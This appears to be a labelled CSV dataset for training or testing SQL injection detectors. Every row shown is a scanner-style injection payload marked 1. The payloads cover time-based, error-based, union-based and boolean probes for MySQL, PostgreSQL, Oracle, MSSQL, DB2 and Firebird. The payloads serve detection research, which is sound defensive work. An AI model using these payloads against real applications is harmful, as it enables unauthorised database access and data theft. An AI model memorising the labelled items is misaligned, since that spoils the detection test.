Sentence,Label
"1%"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )    and ""%""  =  """,1
"-5561""   )    )    or 7292  =  6184#",1
"call regexp_substring  (  repeat  (  right  (  char  (  3712  )  ,1  )  ,511111111  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",1
"-3113'  )   where 2127  =  2127 union all select 2127,2127,2127,2127--",1
"1""  )   or sleep  (  5  )  #",1
"1'+  (  select qjng where 1897  =  1897 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1
1   )    )    as eigk where 2557  =  2557,1
1'||  (  select 'gbyh' from dual where 5889  =  5889 order by 1#,1
"1   )    )    as rqbo where 2243  =  2243 and exp  (  ~  (  select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8191  =  8191,1   )    )     )  ,1x717a767a71,1x78   )    )   x   )    )   --",1
"1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
"1%""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  6271  =  6271,1   )    )     )  ,1x717a767a71,1x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,1
"1' in boolean mode  )   and 3212  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )   #",1
"1""   )    )    as tpeh where 6316  =  6316 and 5965  =  5816#",1
"1' where 1272  =  1272 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  113  )  ,5  )  --",1
-7172'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
"-5288'  )   or make_set  (  1164  =  1711,1711  )   and   (  'pkwy'  =  'pkwy",1
1'+  (  select 'tjvt' where 2463  =  2463,1
"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )   ",1
"1'   )    )    as ijyi where 3694  =  3694   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,1  )  ,511111111  )  ,null  )   else char  (  118  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
1%'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',1
1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',1
"1""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""fuus"" like ""fuus",1
"1""  )   and 2954  =  1256--",1
"-3587'  )   or 5123  =  ctxsys.drithsx.sn  (  5123,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  5123  =  5123  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'psqt' like 'psqt",1
"1' in boolean mode  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,1x717a767a71,1x78   )    )   s  )  , 8446744173719551611, 8446744173719551611   )    )     )  #",1
"-7347""   )    )    union all select 4361,4361,4361,4361,4361,4361,4361,4361,4361#",1
"1'  )   and 3212  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )    and   (  'xikz' like 'xikz",1
"1 procedure analyse  (  extractvalue  (  9255,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x52515a51   )    )      )    )     )  ,1  )  ",1
"1'   )    )     )   and extractvalue  (  7982,concat  (  1x5c,1x7171716a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,1x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",1
"1%""   )    )     )   and   (  3512  =  7893  )  *7893 and    (    (     (  ""%""  =  """,1
"1""   )    )    union all select null,null,null,null#",1
"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",1
"1""  )   as ronb where 9368  =  9368",1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,1
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  113  )  ,5  )   and    (    (   ""nubc"" like ""nubc",1
1   )    )    as oqyo where 7995  =  7995,1
"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"1' in boolean mode  )   and 6155  =  ctxsys.drithsx.sn  (  6155,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  6155  =  6155  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",1
"1""  )   where 9359  =  9359 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1%'   )    )     )   or 1122  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #,1
select   (  case when   (  9131  =  1826  )   then 9131 else 9131*  (  select 9131 from mysql.db  )   end  )  #,1
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",1
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  ',1
"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",1
"1%""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,1
1'+  (  select ksoh where 6339  =  6339,1
1   )    )    as pmff where 6649  =  6649,1
"1'  )   or extractvalue  (  1297,concat  (  1x5c,1x7171716a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,1x717a767a71   )    )   ",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ||'",1
"1""   )    )     )   and 7135  =  8815#",1
"1""   )    )    as xcyo where 2929  =  2929",1
"-8611"" or elt  (  1132  =  1132,3623  )   and ""kfsn"" like ""kfsn",1
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'gpax'  =  'gpax,1
"select * from generate_series  (  6211,6211,case when   (  6211  =  5449  )   then 1 else 1 end  )   limit 1--",1
"1' procedure analyse  (  extractvalue  (  9255,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x52515a51   )    )      )    )     )  ,1  )   and 'gbpg'  =  'gbpg",1
select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,1
"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc",1
"1' where 1231  =  1231 or char  (  75  )  ||char  (  71  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,1  )  ,511111111  )  ,null  )  --",1
"select * from generate_series  (  9964,9964,case when   (  9964  =  4455  )   then 1 else 1 end  )   limit 1--",1
select case when 6662  =  9889 then 1 else null end--,1
1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
select   (  case when   (  6145  =  2786  )   then 6145 else 1/  (  select 1  )   end  )  --,1
1'  )   and 7533  =  7533 and   (  'cryr'  =  'cryr,1
"1  )   and elt  (  3138  =  1817,1817  )  ",1
-2214'  )   union all select 8228#,1
if  (  4194  =  4133  )   select 4194 else drop function tqhz--,1
"1   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )   --",1
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'qtfl'  =  'qtfl",1
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza",1
-4873'   )    )     )   or 3138  =  3138,1
1'  )   as njfg where 6392  =  6392 waitfor delay '1:1:5'--,1
1' and 7533  =  7533 and 'jwgc'  =  'jwgc,1
select   (  case when   (  2132  =  8969  )   then 1 else 2132*  (  select 2132 from master..sysdatabases  )   end  )  --,1
"1'   )    )     )   or 1122  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,1  )  ,511111111  )  ,null  )   else char  (  118  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  'vjnf' like 'vjnf",1
"-2359' union all select 2687,2687,2687#",1
1  )   where 2941  =  2941,1
"1""  )   as yggn where 1116  =  1116 procedure analyse  (  extractvalue  (  5841,concat  (  1x5c,1x7171716a71,  (  select   (  case when   (  5841  =  5841  )   then 1 else 1 end   )    )   ,1x717a767a71   )    )   ,1  )  --",1
-4184'   )    )     )   or 2579  =  4654#,1
"1  )   where 8338  =  8338 and 6155  =  ctxsys.drithsx.sn  (  6155,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  6155  =  6155  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1%'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  '%'  =  '",1
"1'||  (  select 'qued' where 9811  =  9811 procedure analyse  (  extractvalue  (  9627,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x4b774c75   )    )      )    )     )  ,1  )  #",1
"1%'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )   --",1
"1""  )   as kzuq where 4259  =  4259",1
"1""  )   and char  (  121  )  ||char  (  116  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,1  )  ,5111111111  )  ,null  )   and   (  ""lsca"" like ""lsca",1
1' in boolean mode  )   and   (  8611  =  2985  )  *2985#,1
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh,1
"1%'   )    )    union all select null,null,null,null,null,null,null#",1
"-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",1
"1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x4b774c75   )    )      )    )     )  ,1  )  #",1
waitfor delay '1:1:5' and 'fjpf' like 'fjpf,1
1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,1
"1"" where 3434  =  3434",1
"1'   )    )     )   and make_set  (  9514  =  8668,8668  )   and    (    (     (  'sgjj' like 'sgjj",1
"-7136%' or 5123  =  ctxsys.drithsx.sn  (  5123,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  5123  =  5123  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",1
-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop,1
"1   )    )    as xvyi where 6711  =  6711 union all select null,null,null,null#",1
"-7116' where 6966  =  6966 union all select 6966,6966,6966,6966#",1
"1' where 8183  =  8183 and updatexml  (  3393,concat  (  1x2e,1x7171716a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,1x717a767a71  )  ,1161  )  --",1
"1'   )    )    and updatexml  (  3393,concat  (  1x2e,1x7171716a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,1x717a767a71  )  ,1161  )   and    (    (   'vedm'  =  'vedm",1
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 1x28 end   )    )    and 'hyun' like 'hyun,1
select   (  case when   (  4393  =  2875  )   then 1 else 4393*  (  select 4393 from master..sysdatabases  )   end  )  --,1
"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",1
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'qbdm'  =  'qbdm",1
1'+  (  select byor where 4538  =  4538,1
"-3159 or 1571  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  1571  =  1571  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
1' or sleep  (  5  ) ,1
select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 1  )   end  )  --,1
1%'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ',1
"1'||  (  select 'wvio' from dual where 8934  =  8934 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  111  )  ||chr  (  68  )  ,5  )  --",1
"1'  )   and 6511  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"1'  )   where 7279  =  7279 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1""  )   where 2116  =  2116 and   (  1547  =  2193  )  *2193--",1
 (  8362  =  9139  )  *9139,1
-6567'   )    )    union all select 3217#,1
"1' procedure analyse  (  extractvalue  (  9627,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x4b774c75   )    )      )    )     )  ,1  )  #",1
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'ebuo'  =  'ebuo",1
"1%""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,1
